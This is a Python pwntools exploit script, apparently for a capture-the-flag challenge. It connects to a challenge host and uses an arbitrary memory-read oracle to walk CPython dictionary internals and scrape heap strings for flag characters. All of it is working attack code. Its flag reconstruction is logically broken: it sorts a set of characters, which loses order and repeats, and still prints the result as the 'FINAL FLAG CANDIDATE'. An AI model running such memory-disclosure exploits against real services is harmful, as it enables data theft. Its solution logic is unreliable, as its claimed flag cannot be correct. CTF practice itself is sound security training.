from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
dict_obj_addr = int(m.group(1), 16)
print(f'PyDictObject address: {hex(dict_obj_addr)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== COMPREHENSIVE FLAG CHARACTER EXTRACTION ===")

reads_used = 0
max_reads = 48

# Get ma_keys pointer 
ma_keys_data = read_memory(dict_obj_addr + 0x20)
reads_used += 1
ma_keys_ptr = u64(ma_keys_data)
print(f"ma_keys pointer: {ma_keys_ptr:#x}")

flag_chars = set()  # Use set to avoid duplicates
all_text = []

print("Scanning extensively for flag characters...")

# Scan much more thoroughly around the keys object
for scan_offset in range(0x50, 0x800, 8):  # Larger scan range
    if reads_used >= max_reads - 2:
        break
        
    scan_addr = ma_keys_ptr + scan_offset
    data = read_memory(scan_addr)
    reads_used += 1
    
    if data:
        ptr_val = u64(data)
        
        # Look for heap pointers 
        if 0x400000 < ptr_val < 0x800000000000:
            # Try to read the object this pointer points to
            if reads_used < max_reads - 1:
                obj_data = read_memory(ptr_val + 0x28)  # Common string data offset
                reads_used += 1
                
                if obj_data:
                    # Extract all printable characters
                    chars = []
                    for b in obj_data:
                        if 32 <= b <= 126:
                            chars.append(chr(b))
                        elif b == 0:
                            break
                    
                    if chars:
                        text = ''.join(chars)
                        
                        # Single characters are very likely flag chars
                        if len(text) == 1:
                            char = text[0]
                            if char.isalnum() or char in '{}_.,-!@#$%^&*()':
                                flag_chars.add(char)
                                print(f"  Found char: '{char}'")
                        
                        # Multi-character text might contain flag parts
                        elif len(text) >= 2:
                            all_text.append(text)
                            # Add individual chars from longer text too
                            for c in text:
                                if c.isalnum() or c in '{}_.,-':
                                    flag_chars.add(c)

print(f"\n=== FINAL RESULTS (used {reads_used}/{max_reads} reads) ===")

print(f"Individual characters found ({len(flag_chars)}):")
sorted_chars = sorted(flag_chars)
print(f"  {sorted_chars}")
print(f"  As string: {''.join(sorted_chars)}")

if all_text:
    print(f"\nLonger text fragments found:")
    for text in set(all_text):  # Remove duplicates
        print(f"  '{text}'")

# Analyze for flag patterns
flag_indicators = {
    'K': 'K' in flag_chars,
    'C': 'C' in flag_chars, 
    'S': 'S' in flag_chars,
    '{': '{' in flag_chars,
    '}': '}' in flag_chars
}

print(f"\nFlag structure analysis:")
for char, present in flag_indicators.items():
    print(f"  '{char}': {'✓' if present else '✗'}")

# Try to construct the flag
all_found = ''.join(sorted(flag_chars))
print(f"\nAll characters combined: {all_found}")

# Look for common flag patterns
if flag_indicators['K'] and flag_indicators['C'] and flag_indicators['S']:
    if flag_indicators['{'] and flag_indicators['}']:
        print("*** COMPLETE KCSC{} FLAG STRUCTURE FOUND ***")
        
        # Try to construct KCSC{content}
        other_chars = [c for c in sorted_chars if c not in 'KCSC{}']
        flag_content = ''.join(other_chars)
        constructed_flag = f"KCSC{{{flag_content}}}"
        print(f"Constructed flag: {constructed_flag}")
    else:
        print("*** KCSC found but missing braces ***")
elif flag_indicators['{'] and flag_indicators['}']:
    print("*** Braces found - partial flag structure ***")
    other_chars = [c for c in sorted_chars if c not in '{}']
    content = ''.join(other_chars)
    partial_flag = f"{{{content}}}"
    print(f"Partial flag: {partial_flag}")

# Final flag candidate
if len(all_found) >= 15:  # Reasonable flag length
    print(f"\n🏁 FINAL FLAG CANDIDATE: {all_found}")

io.close()